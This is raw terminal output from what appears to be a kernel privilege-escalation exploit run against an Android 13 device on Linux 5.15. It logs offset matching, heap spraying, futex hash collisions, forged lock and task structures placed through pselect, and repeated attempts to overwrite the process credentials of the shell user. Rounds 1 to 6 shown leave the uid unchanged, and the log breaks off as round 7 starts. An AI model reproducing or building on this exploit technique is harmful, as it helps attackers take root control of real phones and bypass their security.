[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=6269 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
[32m[+] [0mstartup limits pid=6269 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=6269 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=6269 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[32m[+] [0mSELinux already off
[33m[*] [0m[T+1519ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff8060e93600 (53/256 votes)
[33m[*] [0m[T+1954ms] perf_find_task done
[33m[*] [0mchild_pid=6845 child_task=0xffffff8060e93600
[33m[*] [0mround 1/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8060e93d98 mode=2
[33m[*] [0m[T+3496ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15281..16447] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+11769ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff80af770000 fake_lock=ffffff80af770000 fake_w0=ffffff80af770300 fake_task=ffffff80af770400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff80af770400 ex3=ffffff80af770000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +202ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
[33m[*] [0mpselect route probing cfi attempt=1 ret=0 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0m[T+12982ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 2/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8060e93d98 mode=2
[33m[*] [0m[T+20161ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[12581..15854] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+32525ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff80d4f30000 fake_lock=ffffff80d4f30000 fake_w0=ffffff80d4f30300 fake_task=ffffff80d4f30400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff80d4f30400 ex3=ffffff80d4f30000
[33m[*] [0mpselect pre-select +2ms
[33m[*] [0mpselect post-select +208ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+33750ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 3/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8060e93d98 mode=2
[33m[*] [0m[T+42206ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[10680..12879] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+53329ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff80f5a68000 fake_lock=ffffff80f5a68000 fake_w0=ffffff80f5a68300 fake_task=ffffff80f5a68400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff80f5a68400 ex3=ffffff80f5a68000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +204ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+54545ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 4/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8060e93d98 mode=2
[33m[*] [0m[T+64031ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[9507..10189] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+77724ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff800a0f8000 fake_lock=ffffff800a0f8000 fake_w0=ffffff800a0f8300 fake_task=ffffff800a0f8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff800a0f8400 ex3=ffffff800a0f8000
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +204ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+78986ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 5/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8060e93d98 mode=2
[33m[*] [0m[T+93172ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[16965..19467] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+113319ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff801b6d8000 fake_lock=ffffff801b6d8000 fake_w0=ffffff801b6d8300 fake_task=ffffff801b6d8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff801b6d8400 ex3=ffffff801b6d8000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +203ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+114539ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 6/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8060e93d98 mode=2
[33m[*] [0m[T+131243ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[14365..15808] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+146743ms]   heap spray done
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=16 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=4 page=ffffff8012da8000 fake_lock=ffffff8012da8000 fake_w0=ffffff8012da8300 fake_task=ffffff8012da8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8012da8400 ex3=ffffff8012da8000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+147948ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 7/10: cred write
